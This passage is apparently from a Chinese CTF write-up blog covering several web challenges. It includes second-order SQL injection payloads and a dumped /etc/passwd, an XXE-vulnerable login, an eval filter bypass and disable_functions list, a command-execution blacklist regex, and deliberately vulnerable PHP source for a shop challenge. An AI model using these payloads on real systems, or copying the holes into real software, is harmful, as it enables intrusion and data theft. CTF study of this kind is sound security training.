case &#39;comment&#39;:
    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num&gt;0){
    $category = mysql_fetch_array($result)[&#39;category&#39;];
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;#insert into comment set category = &#39;result&#39; bo_id=&#39;1\&#39;,content=&#39;&#39;,bo_id=&#39;xxx&#39;;
    $result = mysql_query($sql);
    }
    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
    break;
default:
    header(&quot;Location: ./index.php&quot;);
}
}
else{
    header(&quot;Location: ./index.php&quot;);
}
?&gt;
</code></pre>
<p>需要登陆才能留言</p>
<p>爆破可知: zhangwei / zhangwei666 (我吐了爆破半天没出来还是谷歌的,谁知道后面是全数字)</p>
<p>代码审计发现经典的二次注入啊</p>
<p>因为没有报错所以不知道自己的语句是否正确就调了很久</p>
<p>令<code>catagory=&#39;\\&#39;</code>,</p>
<pre><code>content=%2Ccontent%3D0x6464646464%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
content=%2Ccontent%3D(SELECT+group_concat(schema_name)+FROM+information_schema.schemata)%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
</code></pre><p>去把数据库dump下来后发现没啥东西</p>
<p>接着去试试读取文件</p>
<p>发现可以读取文件</p>
<p>读取/etc/passwd得到</p>
<pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
www:x:500:500:www:/home/www:/bin/bash</code></pre><p>发现只有一个可以登陆的用户:<code>www</code></p>
<p>查看他的<code>.bash_history</code></p>
<pre><code class="shell">cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start</code></pre>
<p>发现他要删除<code>.DS_Store</code>防止我们知道目录结构,但是<code>/tmp</code>目录是没有这个文件的,也就是所<code>/tmp/www</code>下有<code>.DS_Store</code>文件,拿到文件解析后得到flag文件名</p>
<pre><code>bootstrap
comment.php
css
flag_8946e1ff1ee3e40f.php
fonts
index.php
js
login.php
mysql.php
vendor
write_do.php</code></pre><h2 id="fakexml"><a href="#fakexml" class="headerlink" title="fakexml"></a>fakexml</h2><p>存在xxe</p>
<pre><code class="php">&lt;?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = &#39;admin&#39;; //
$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);

    $username = $creds-&gt;username;
    $password = $creds-&gt;password;

    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
    }else{
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
    }    
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
}

header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>直接读取/flag得到flag:<code>flag{663e8e72-be03-4533-a4cd-c44452942287}</code></p>
<h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><pre><code class="php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;code&#39;])){
            $code=$_GET[&#39;code&#39;];
                    if(strlen($code)&gt;40){
                                        die(&quot;This is too Long.&quot;);
                                                }
                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
                                        die(&quot;NO.&quot;);
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?&gt;</code></pre>
<p>代码很简单,但是限制有点麻烦,我们利用<code>~</code>来绕过不允许字母和数字的限制</p>
<blockquote>
<p> 因为是一个语言构造器而不是一个函数，不能被 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/functions.variable-functions.html">可变函数</a> 调用。 </p>
</blockquote>
<p>所以不能直接<code>(~&quot;eval的~&quot;)(&quot;xxxxx&quot;)</code>,都没总结这些命令,导致我过了很久才想起assert</p>
<p>disable_function:</p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>要读取flag必须命令执行,但是根据phpinfo,他禁用了system,exec等等用<code>https://github.com/mm0r1</code>这个大佬的脚本来绕过</p>
<p><code>flag{c7e5be35-729b-4bd0-aacd-c7a1eb98ddea}</code></p>
<h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><p>允许的字符:<code>,:,a-z,{,}</code></p>
<p>黑名单:<code>pwd,echo</code></p>
<p>刚开始以为是假的命令执行,看到报错后发现这是真的</p>
<pre><code class="php">Warning&lt;/b&gt;:  system() expects parameter 1 to be string, array given in &lt;b&gt;/var/www/html/index.php</code></pre>
<p>那先想办法读取index.php,测试后发现是用<code>$_REQUEST</code>来接受数据</p>
<p>后来实在没想法就去百度了,看到的wp都是清一色的直接给源码?????您们源码哪来的</p>
<pre><code class="php">&lt;?php

putenv(&#39;PATH=/home/rceservice/jail&#39;);

if (isset($_REQUEST[&#39;cmd&#39;])) {
  $json = $_REQUEST[&#39;cmd&#39;];

  if (!is_string($json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } else {
    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
    $cmd = json_decode($json, true)[&#39;cmd&#39;];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo &#39;Invalid input&#39;;
    }
    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
  }
}

?&gt;</code></pre>
<p>用换行来绕过preg_match或者输入足够长的字符来绕过preg的回溯次数</p>
<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><pre><code class="php">&lt;?php

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

// $file = $_GET[&quot;file&quot;];
$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
if (isset($file)){
    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
        echo(&#39;no way!&#39;);
        exit;
    }
    @include($file);
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;index&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;/h2&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;h3&gt;提交订单&lt;/h3&gt;
                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;地址:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;我正是送钱之人&lt;/button&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;!--?file=?--&gt;
</code></pre>
<p>search.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;; 

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);#日穿
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        if(!$row) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;搜索&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;订单查询&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt; 
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;    
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>change.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = addslashes($_POST[&quot;address&quot;]);
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单修改成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;修改收货地址&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;修改收货地址&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;地址:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>delete.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单删除成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;删除订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;删除订单&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>confirm.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;
//var_dump($_POST);

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = $_POST[&quot;address&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if($fetch-&gt;num_rows&gt;0) {
        $msg = $user_name.&quot;已提交订单&quot;;
    }else{
        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
        $re = $db-&gt;prepare($sql);
        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
        $re = $re-&gt;execute();
        if(!$re) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单提交成功&quot;;
    }
} else {
    $msg = &quot;信息不全&quot;;
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;确认订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
                &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
                &lt;/a&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
